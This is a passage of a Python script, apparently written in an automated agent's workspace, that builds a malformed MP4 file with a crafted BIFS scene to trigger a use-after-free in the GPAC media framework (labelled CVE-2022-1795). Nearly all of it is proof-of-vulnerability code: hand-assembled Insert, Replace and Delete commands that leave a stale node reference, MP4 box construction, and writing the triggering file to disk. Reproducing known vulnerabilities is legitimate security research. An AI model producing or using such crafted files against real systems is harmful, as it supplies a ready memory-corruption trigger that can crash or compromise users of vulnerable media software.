 ])\n    \n    # Add child node (another Group) with ID 2\n    bifs_data.extend([\n        0x01,  # Number of children = 1\n        0xC0,  # Node tag\n        0x60,  # Group node\n        0x80,  # Has DEF\n        0x02,  # Node ID = 2\n        0x00,  # End of child node fields\n    ])\n    \n    bifs_data.extend([\n        0x00,  # End of root node fields\n    ])\n    \n    # Insert command - this creates a reference to node 2 in command structure\n    # Command type 1 = Insert\n    bifs_data.extend([\n        0x20,  # Insert command (type 1, shifted)\n        0x01,  # Target node ID = 1\n        0x00,  # Field index = 0 (children)\n        0x00,  # Position = 0\n    ])\n    \n    # Insert a USE reference to node 2 (creates duplicate reference)\n    bifs_data.extend([\n        0x01,  # Number of nodes to insert = 1\n        0xA0,  # USE node (reference to existing node)\n        0x02,  # Node ID = 2 (reference)\n    ])\n    \n    # Replace command with CommandBuffer field\n    # This is critical - CommandBuffer can embed sub-commands\n    # Command type 2 = Replace\n    bifs_data.extend([\n        0x40,  # Replace command (type 2, shifted)\n        0x01,  # Target node ID = 1\n        0x00,  # Field index = 0\n    ])\n    \n    # New value: create a node with SFCommandBuffer field\n    # Use a Conditional node which has commandBuffer field\n    bifs_data.extend([\n        0xE8,  # Conditional node tag (TAG_MPEG4_Conditional = 29)\n        0xA0,  # Has fields\n        0x80,  # Field mask - buffer field present\n    ])\n    \n    # CommandBuffer field value - embed commands that reference node 2\n    bifs_data.extend([\n        0x10,  # Buffer length indicator\n        # Embedded command: Replace referencing node 2\n        0x40,  # Replace command\n        0x02,  # Target node = 2 (will create stale ref)\n        0x00,  # Field index\n        0x00,  # Simple value\n    ])\n    \n    bifs_data.extend([\n        0x00,  # End of Conditional node\n    ])\n    \n    # Delete command - this will free node 2\n    # Command type 4 = Delete\n    bifs_data.extend([\n        0x80,  # Delete command (type 4, shifted)\n        0x02,  # Node ID = 2 to delete\n    ])\n    \n    # The UAF will occur during cleanup when:\n    # 1. Delete command freed node 2\n    # 2. CommandBuffer field still has embedded command referencing node 2\n    # 3. gf_sg_command_del iterates and tries to destroy node 2 again\n    \n    return bytes(bifs_data)\n\ndef create_esds(object_type_indication, dsi_data):\n    """Create Elementary Stream Descriptor"""\n    es_desc = bytearray([0x03])  # ES_DescrTag\n    \n    es_data = bytearray([\n        0x00, 0x01,  # ES_ID = 1\n        0x00,        # flags\n    ])\n    \n    # DecoderConfigDescriptor\n    dec_config = bytearray([0x04])\n    dec_config_data = bytearray([\n        object_type_indication,\n        0x11,  # streamType = Scene (0x03 << 2) | 0x01\n        0x00, 0x18, 0x00,  # bufferSizeDB\n        0x00, 0x01, 0xF4, 0x00,  # maxBitrate\n        0x00, 0x01, 0xF4, 0x00,  # avgBitrate\n    ])\n    \n    if dsi_data:\n        dsi = bytearray([0x05])\n        dsi += bytes([len(dsi_data)])\n        dsi += dsi_data\n        dec_config_data += dsi\n    \n    dec_config += bytes([len(dec_config_data)])\n    dec_config += dec_config_data\n    es_data += dec_config\n    \n    # SLConfigDescriptor\n    sl_config = bytearray([0x06, 0x01, 0x02])\n    es_data += sl_config\n    \n    es_desc += bytes([len(es_data)])\n    es_desc += es_data\n    \n    return bytes(es_desc)\n\ndef create_mp4_with_bifs():\n    """Create MP4 file with BIFS scene that triggers UAF"""\n    output = io.BytesIO()\n    \n    # ftyp box\n    ftyp_data = b\'isom\' + struct.pack(\'>I\', 0x200) + b\'isomiso2mp41\'\n    output.write(write_box(b\'ftyp\', ftyp_data))\n    \n    # Prepare BIFS sample\n    bifs_sample = create_bifs_sample()\n    \n    # BIFS decoder specific info\n    bifs_dsi = bytearray([\n        0x00,  # Version\n        0x00, 0x01,  # Scene info\n        0x00, 0x00,  # Pixel metrics\n    ])\n    \n    # moov box\n    moov_data = io.BytesIO()\n    \n    # mvhd\n    mvhd_data = struct.pack(\'>I\', 0)\n    mvhd_data += struct.pack(\'>IIIIHH\', 0, 0, 1000, 3000, 0x00010000, 0x0100)\n    mvhd_data += b\'\\x00\\x00\' + struct.pack(\'>I\', 0x40000000)\n    mvhd_data += b\'\\x00\' * 24\n    mvhd_data += struct.pack(\'>I\', 2)\n    moov_data.write(write_box(b\'mvhd\', mvhd_data))\n    \n    # trak box for BIFS\n    trak_data = io.BytesIO()\n    \n    # tkhd\n    tkhd_data = struct.pack(\'>I\', 7)\n    tkhd_data += struct.pack(\'>IIII\', 0, 0, 1, 0)\n    tkhd_data += struct.pack(\'>IQH\', 3000, 0, 0)\n    tkhd_data += struct.pack(\'>HI\', 0, 0x00010000)\n    tkhd_data += struct.pack(\'>IIIIIIIIIHH\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000, 320, 240)\n    trak_data.write(write_box(b\'tkhd\', tkhd_data))\n    \n    # mdia box\n    mdia_data = io.BytesIO()\n    \n    # mdhd\n    mdhd_data = struct.pack(\'>IIIIII\', 0, 0, 0, 1000, 3000, 0x55c40000)\n    mdia_data.write(write_box(b\'mdhd\', mdhd_data))\n    \n    # hdlr\n    hdlr_data = struct.pack(\'>I\', 0)\n    hdlr_data += struct.pack(\'>I\', 0)\n    hdlr_data += b\'sdsm\'  # scene description handler\n    hdlr_data += struct.pack(\'>III\', 0, 0, 0)\n    hdlr_data += b\'GPAC BIFS Handler\\x00\'\n    mdia_data.write(write_box(b\'hdlr\', hdlr_data))\n    \n    # minf box\n    minf_data = io.BytesIO()\n    \n    # nmhd\n    nmhd_data = struct.pack(\'>I\', 0)\n    minf_data.write(write_box(b\'nmhd\', nmhd_data))\n    \n    # dinf box\n    dinf_data = io.BytesIO()\n    dref_data = struct.pack(\'>II\', 0, 1)\n    dref_data += struct.pack(\'>I4sI\', 12, b\'url \', 1)\n    dinf_data.write(write_box(b\'dref\', dref_data))\n    minf_data.write(write_box(b\'dinf\', dinf_data.getvalue()))\n    \n    # stbl box\n    stbl_data = io.BytesIO()\n    \n    # stsd\n    stsd_data = struct.pack(\'>II\', 0, 1)\n    \n    # mp4s sample entry\n    mp4s_data = b\'\\x00\' * 6 + struct.pack(\'>H\', 1)\n    \n    # esds in mp4s\n    esds_data = create_esds(0x02, bifs_dsi)  # 0x02 = BIFS\n    mp4s_data += write_fullbox(b\'esds\', 0, 0, esds_data)\n    \n    stsd_data += write_box(b\'mp4s\', mp4s_data)\n    stbl_data.write(write_box(b\'stsd\', stsd_data))\n    \n    # stts\n    stts_data = struct.pack(\'>III\', 0, 1, 1) + struct.pack(\'>I\', 3000)\n    stbl_data.write(write_box(b\'stts\', stts_data))\n    \n    # stsc\n    stsc_data = struct.pack(\'>IIIII\', 0, 1, 1, 1, 1)\n    stbl_data.write(write_box(b\'stsc\', stsc_data))\n    \n    # stsz\n    stsz_data = struct.pack(\'>IIII\', 0, 0, 1, len(bifs_sample))\n    stbl_data.write(write_box(b\'stsz\', stsz_data))\n    \n    # stco (placeholder)\n    stco_data = struct.pack(\'>III\', 0, 1, 0xDEADBEEF)\n    stbl_data.write(write_box(b\'stco\', stco_data))\n    \n    minf_data.write(write_box(b\'stbl\', stbl_data.getvalue()))\n    mdia_data.write(write_box(b\'minf\', minf_data.getvalue()))\n    trak_data.write(write_box(b\'mdia\', mdia_data.getvalue()))\n    moov_data.write(write_box(b\'trak\', trak_data.getvalue()))\n    \n    moov_bytes = moov_data.getvalue()\n    output.write(write_box(b\'moov\', moov_bytes))\n    \n    # Calculate mdat offset\n    mdat_offset = output.tell() + 8\n    \n    # Patch stco\n    output.seek(0)\n    output.write(write_box(b\'ftyp\', ftyp_data))\n    \n    moov_patched = bytearray(moov_bytes)\n    placeholder_pos = moov_patched.find(b\'\\xDE\\xAD\\xBE\\xEF\')\n    if placeholder_pos != -1:\n        struct.pack_into(\'>I\', moov_patched, placeholder_pos, mdat_offset)\n    \n    output.write(write_box(b\'moov\', bytes(moov_patched)))\n    \n    # mdat box\n    output.write(write_box(b\'mdat\', bifs_sample))\n    \n    return output.getvalue()\n\n# Generate the PoV file\noutput_path = \'/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2022-1795/triggering/round3/testcase-round3\'\n\nmp4_data = create_mp4_with_bifs()\n\nwith open(output_path, \'wb\') as f:\n    f.write(mp4_data)\n\nprint(f"Generated PoV at {output_path} ({len(mp4_data)} bytes)")\nprint("This MP4 contains a BIFS scene with CommandBuffer embedding commands")\nprint("that reference nodes, creating stale pointers during cleanup -> UAF")\n'}
